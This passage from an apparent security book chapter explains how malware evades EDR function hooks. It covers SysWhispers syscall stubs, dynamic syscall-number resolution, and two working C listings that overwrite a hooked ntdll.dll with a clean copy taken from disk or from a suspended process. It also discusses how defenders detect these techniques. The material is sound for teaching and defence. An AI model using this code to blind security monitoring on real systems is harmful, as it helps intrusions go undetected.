NtCreateThreadEx_SystemCall_Unknown: ; Unknown/unsupported version.&#13;
    ret&#13;
NtCreateThreadEx_Epilogue:&#13;
    mov r10, rcx&#13;
  <span class="CodeAnnotationCode-1" aria-label="annotation3">❸</span> syscall&#13;
    ret&#13;
NtCreateThreadEx ENDP</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 2-10: The SysWhispers output for <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">ntdll!NtCreateThreadEx()</samp></span></p>&#13;
<p class="TX">This assembly code extracts the build number from the process environment block <span class="CodeAnnotation" aria-label="annotation1">❶</span> and then uses that value to move the appropriate syscall number into the EAX register <span class="CodeAnnotation" aria-label="annotation2">❷</span> before making the syscall <span class="CodeAnnotation" aria-label="annotation3">❸</span>. While this approach works, it requires substantial effort, as the attacker must update the syscall numbers in their dataset each time Microsoft releases a new Windows build.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec7">&#13;
<h3 class="H2" id="sec7"><span id="h-28"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Dynamically Resolving Syscall Numbers</samp></h3>&#13;
<p class="TNI">In December 2020, a researcher known by @modexpblog on Twitter published a blog post titled “Bypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams.” The post described another function-hook evasion technique: dynamically resolving syscall numbers at runtime, which kept attackers from having to hardcode the values for each Windows build. This technique uses the following workflow to create a dictionary of function names and syscall numbers:</p>&#13;
<ol class="NL">&#13;
<li class="NL">Get a handle to the current process’s mapped <i>ntdll.dll</i>.</li>&#13;
<li class="NL">Enumerate all exported functions that begin with <i>Zw</i> to identify system calls. Note that functions prefixed with <i>Nt</i> (which is more commonly seen) work identically when called from user mode. The decision to use the Zw version appears to be arbitrary in this case.</li>&#13;
<li class="NL">Store the exported function names and their associated relative virtual addresses.</li>&#13;
<li class="NL">Sort the dictionary by relative virtual addresses.</li>&#13;
<li class="NL">Define the syscall number of the function as its index in the dictionary after sorting.</li>&#13;
</ol>&#13;
<p class="TX">Using this technique, we can collect syscall numbers at runtime, insert them into the stub at the appropriate location, and then call the target functions as we otherwise would in the statically coded method.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec8">&#13;
<h3 class="H2" id="sec8"><span id="h-29"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_28" aria-label=" Page 28. "/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Remapping ntdll.dll</samp></h3>&#13;
<p class="TNI">Another common technique used to evade user-mode function hooks is to load a new copy of <i>ntdll.dll</i> into the process, overwrite the existing hooked version with the contents of the newly loaded file, and then call the desired functions. This strategy works because the newly loaded <i>ntdll.dll</i> does not contain the hooks implemented in the copy loaded earlier, so when it overwrites the tainted version, it effectively cleans out all the hooks placed by the EDR. <a href="#list2-11">Listing 2-11</a> shows a rudimentary example of this. Some lines have been omitted for brevity.</p>&#13;
<pre id="list2-11"><code>int wmain()&#13;
{&#13;
    HMODULE hOldNtdll = NULL;&#13;
    MODULEINFO info = {};&#13;
    LPVOID lpBaseAddress = NULL;&#13;
    HANDLE hNewNtdll = NULL;&#13;
    HANDLE hFileMapping = NULL;&#13;
    LPVOID lpFileData = NULL;&#13;
    PIMAGE_DOS_HEADER pDosHeader = NULL;&#13;
    PIMAGE_NT_HEADERS64 pNtHeader = NULL;&#13;
&#13;
    hOldNtdll = GetModuleHandleW(L"ntdll");&#13;
    if (!GetModuleInformation(&#13;
        GetCurrentProcess(),&#13;
        hOldNtdll,&#13;
        &amp;info,&#13;
        sizeof(MODULEINFO)))&#13;
&#13;
  <span class="CodeAnnotationCode-1" aria-label="annotation1">❶</span> lpBaseAddress = info.lpBaseOfDll;&#13;
&#13;
     hNewNtdll = CreateFileW(&#13;
         L"C:\\Windows\\System32\\ntdll.dll",&#13;
         GENERIC_READ,&#13;
         FILE_SHARE_READ,&#13;
         NULL,&#13;
         OPEN_EXISTING,&#13;
         FILE_ATTRIBUTE_NORMAL,&#13;
         NULL);&#13;
&#13;
     hFileMapping = CreateFileMappingW(&#13;
         hNewNtdll,&#13;
         NULL,&#13;
         PAGE_READONLY | SEC_IMAGE,&#13;
         0, 0, NULL);&#13;
&#13;
  <span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span> lpFileData = MapViewOfFile(&#13;
         hFileMapping,&#13;
         FILE_MAP_READ,&#13;
         0, 0, 0);&#13;
&#13;
    pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;&#13;
    pNtHeader = (PIMAGE_NT_HEADERS64)((ULONG_PTR)lpBaseAddress + pDosHeader-&gt;e_lfanew);<span role="doc-pagebreak" epub:type="pagebreak" id="pg_29" aria-label=" Page 29. "/>&#13;
    for (int i = 0; i &lt; pNtHeader-&gt;FileHeader.NumberOfSections; i++)&#13;
    {&#13;
        PIMAGE_SECTION_HEADER pSection =&#13;
            (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(pNtHeader) +&#13;
            ((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));&#13;
&#13;
      <span class="CodeAnnotationCode-1" aria-label="annotation3">❸</span> if (!strcmp((PCHAR)pSection-&gt;Name, ".text"))&#13;
       {&#13;
           DWORD dwOldProtection = 0;&#13;
         <span class="CodeAnnotationCode-1" aria-label="annotation4">❹</span> VirtualProtect(&#13;
               (LPVOID)((ULONG_PTR)lpBaseAddress + pSection-&gt;VirtualAddress),&#13;
               pSection-&gt;Misc.VirtualSize,&#13;
               PAGE_EXECUTE_READWRITE,&#13;
               &amp;dwOldProtection&#13;
           );&#13;
&#13;
         <span class="CodeAnnotationCode-1" aria-label="annotation5">❺</span> memcpy(&#13;
               (LPVOID)((ULONG_PTR)lpBaseAddress + pSection-&gt;VirtualAddress),&#13;
               (LPVOID)((ULONG_PTR)lpFileData + pSection-&gt;VirtualAddress),&#13;
               pSection-&gt;Misc.VirtualSize&#13;
           );&#13;
&#13;
         <span class="CodeAnnotationCode-1" aria-label="annotation6">❻</span> VirtualProtect(&#13;
               (LPVOID)((ULONG_PTR)lpBaseAddress + pSection-&gt;VirtualAddress),&#13;
               pSection-&gt;Misc.VirtualSize,&#13;
               dwOldProtection,&#13;
               &amp;dwOldProtection&#13;
           );&#13;
&#13;
           break;&#13;
        }&#13;
    }&#13;
&#13;
    <var>--snip--</var>&#13;
}</code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 2-11: A technique for overwriting a hooked</span> <span class="eSANS_Futura_Std_Book_11a">ntdll.dll</span></p>&#13;
<p class="TX">Our code first gets the base address of the currently loaded (hooked) <i>ntdll.dll</i> <span class="CodeAnnotation" aria-label="annotation1">❶</span>. Then we read in the contents of <i>ntdll.dll</i> from disk and map it into memory <span class="CodeAnnotation" aria-label="annotation2">❷</span>. At this point, we can parse the PE headers of the hooked <i>ntdll.dll</i>, looking for the address of the <i>.text</i> section <span class="CodeAnnotation" aria-label="annotation3">❸</span>, which holds the executable code in the image. Once we find it, we change the permissions of that region of memory so that we can write to it <span class="CodeAnnotation" aria-label="annotation4">❹</span>, copy in the contents of the <i>.text</i> section from the “clean” file <span class="CodeAnnotation" aria-label="annotation5">❺</span>, and revert the change to memory protection <span class="CodeAnnotation" aria-label="annotation6">❻</span>. After this sequence of events completes, the hooks originally placed by the EDR should have been removed and the developer can call whichever function from <i>ntdll.dll</i> they need without the fear of execution being redirected to the EDR’s injected DLL.</p>&#13;
<p class="TX">While reading <i>ntdll.dll</i> from disk seems easy, it does come with a potential trade-off. This is because loading <i>ntdll.dll</i> into a single process multiple times is atypical behavior. Defenders can capture this activity with Sysmon, a free system-monitoring utility that provides many of the same <span role="doc-pagebreak" epub:type="pagebreak" id="pg_30" aria-label=" Page 30. "/>telemetry-collection facilities as an EDR. Almost every non-malicious process has a one-to-one mapping of process GUIDs to loads of <i>ntdll.dll</i>. When I queried these properties in a large enterprise environment, only approximately 0.04 percent of 37 million processes loaded <i>ntdll.dll</i> more than once over the course of a month.</p>&#13;
<p class="TX">To avoid detection based on this anomaly, you might opt to spawn a new process in a suspended state, get a handle to the unmodified <i>ntdll.dll</i> mapped in the new process, and copy it to the current process. From there, you could either get the function pointers as shown before, or replace the existing hooked <i>ntdll.dll</i> to effectively overwrite the hooks placed by the EDR. <a href="#list2-12">Listing 2-12</a> demonstrates this technique.</p>&#13;
<pre id="list2-12"><code>int wmain() {&#13;
    LPVOID pNtdll = nullptr;&#13;
    MODULEINFO mi;&#13;
    STARTUPINFOW si;&#13;
    PROCESS_INFORMATION pi;&#13;
    ZeroMemory(&amp;si, sizeof(STARTUPINFOW));&#13;
    ZeroMemory(&amp;pi, sizeof(PROCESS_INFORMATION));&#13;
&#13;
    GetModuleInformation(GetCurrentProcess(),&#13;
        GetModuleHandleW(L"ntdll.dll"),&#13;
      <span class="CodeAnnotationCode-1" aria-label="annotation1">❶</span> &amp;mi, sizeof(MODULEINFO));&#13;
&#13;
    PIMAGE_DOS_HEADER hooked_dos = (PIMAGE_DOS_HEADER)mi.lpBaseOfDll;&#13;
    PIMAGE_NT_HEADERS hooked_nt =&#13;
      <span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span> (PIMAGE_NT_HEADERS)((ULONG_PTR)mi.lpBaseOfDll + hooked_dos-&gt;e_lfanew);&#13;
&#13;
    CreateProcessW(L"C:\\Windows\\System32\\notepad.exe",&#13;
        NULL, NULL, NULL, TRUE, CREATE_SUSPENDED,&#13;
      <span class="CodeAnnotationCode-1" aria-label="annotation3">❸</span> NULL, NULL, &amp;si, &amp;pi);&#13;
&#13;
  pNtdll = HeapAlloc(GetProcessHeap(), 0, mi.SizeOfImage);&#13;
  ReadProcessMemory(pi.hProcess, (LPCVOID)mi.lpBaseOfDll,&#13;
      pNtdll, mi.SizeOfImage, nullptr);&#13;
&#13;
  PIMAGE_DOS_HEADER fresh_dos = (PIMAGE_DOS_HEADER)pNtdll;&#13;
  PIMAGE_NT_HEADERS fresh_nt =&#13;
     <span class="CodeAnnotationCode-1">4</span> (PIMAGE_NT_HEADERS)((ULONG_PTR)pNtdll + fresh_dos-&gt;e_lfanew);&#13;
&#13;
  for  (WORD i = 0; i &lt; hooked_nt-&gt;FileHeader.NumberOfSections; i++) {&#13;
        PIMAGE_SECTION_HEADER hooked_section =&#13;
            (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(hooked_nt) +&#13;
                ((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));&#13;
&#13;
        if (!strcmp((PCHAR)hooked_section-&gt;Name, ".text")){&#13;
            DWORD oldProtect = 0;&#13;
            LPVOID hooked_text_section = (LPVOID)((ULONG_PTR)mi.lpBaseOfDll +&#13;
                (DWORD_PTR)hooked_section-&gt;VirtualAddress);&#13;
&#13;
            LPVOID fresh_text_section = (LPVOID)((ULONG_PTR)pNtdll +&#13;
                (DWORD_PTR)hooked_section-&gt;VirtualAddress);<span role="doc-pagebreak" epub:type="pagebreak" id="pg_31" aria-label=" Page 31. "/>&#13;
&#13;
            VirtualProtect(hooked_text_section,&#13;
                hooked_section-&gt;Misc.VirtualSize,&#13;
                PAGE_EXECUTE_READWRITE,&#13;
                &amp;oldProtect);&#13;
&#13;
            RtlCopyMemory(&#13;
                hooked_text_section,&#13;
                fresh_text_section,&#13;
                hooked_section-&gt;Misc.VirtualSize);&#13;
&#13;
            VirtualProtect(hooked_text_section,&#13;
                hooked_section-&gt;Misc.VirtualSize,&#13;
                oldProtect,&#13;
                &amp;oldProtect);&#13;
        }&#13;
    }&#13;
    TerminateProcess(pi.hProcess, 0);&#13;
&#13;
    <var>--snip--</var>&#13;
&#13;
    return 0;&#13;
}</code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 2-12: Remapping</span> <span class="eSANS_Futura_Std_Book_11a">ntdll.dll</span> <span class="eSANS_Futura_Std_Book_Oblique_I_11a">in a suspended process</span></p>&#13;
<p class="TX">This minimal example first opens a handle to the copy of <i>ntdll.dll</i> <span class="CodeAnnotation" aria-label="annotation1">❶</span> currently mapped into our process, gets its base address, and parses its PE headers <span class="CodeAnnotation" aria-label="annotation2">❷</span>. Next, it creates a suspended process <span class="CodeAnnotation" aria-label="annotation3">❸</span> and parses the PE headers of this process’s copy of <i>ntdll.dll</i> <span class="CodeAnnotation" aria-label="annotation4">❹</span>, which hasn’t had the chance to be hooked by the EDR yet. The rest of the flow of this function is exactly the same as in the previous example, and when it completes, the hooked <i>ntdll.dll</i> should have been reverted to a clean state.</p>&#13;
<p class="TX">As with all things, there is a trade-off here as well, as our new suspended process creates another opportunity for detection, such as by a hooked <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!NtCreateProcessEx()</samp>, the driver, or the ETW provider. In my experience, it is very rare to see a program create a temporary suspended process for legitimate reasons.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="conclusion" role="doc-conclusion" aria-labelledby="sec9">&#13;
<h2 class="H1" id="sec9"><span id="h-30"/><samp class="SANS_Futura_Std_Bold_B_11">Conclusion</samp></h2>&#13;
<p class="TNI">Function hooking is one of the original mechanisms by which an endpoint security product can monitor the execution flow of other processes. While it provides very useful information to an EDR, it is very susceptible to bypass due to inherent weaknesses in its common implementations. For that reason, most mature EDRs today consider it an auxiliary telemetry source and instead rely on more resilient sensors.</p>&#13;
</section>&#13;
</section>&#13;
</body></html>